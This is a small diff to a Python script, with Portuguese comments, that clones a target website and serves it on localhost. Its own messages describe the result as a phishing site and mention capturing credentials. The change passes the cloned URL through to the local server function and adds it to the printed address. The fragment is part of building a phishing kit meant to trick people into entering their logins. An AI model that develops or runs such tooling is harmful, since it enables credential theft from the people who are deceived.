@@ -275,7 +275,7 @@ def clone_website(url, server_choice, language):
 
             # Continuar com a execução no servidor selecionado (apenas localhost implementado)
             if server_choice == '1':
-                run_local_server(language)
+                run_local_server(url, language)
 
         else:
             print(f"Failed to clone {url}. Status code: {response.status_code}")
@@ -284,7 +284,7 @@ def clone_website(url, server_choice, language):
         print(f"Error cloning website: {e}")
 
 # Função para executar o servidor local
-def run_local_server(language):
+def run_local_server(url, language):
     clear_console()
     if language == '1':
         print("Running phishing site on localhost...")
@@ -303,7 +303,7 @@ def run_local_server(language):
         server_thread.daemon = True
         server_thread.start()
 
-        print("Server running at http://localhost:8080")
+        print(f"Server running at http://localhost:8080/{url}")
         input("\nPress Enter to stop the phishing server and continue...")
 
         # Após capturar as credenciais, parar o servidor
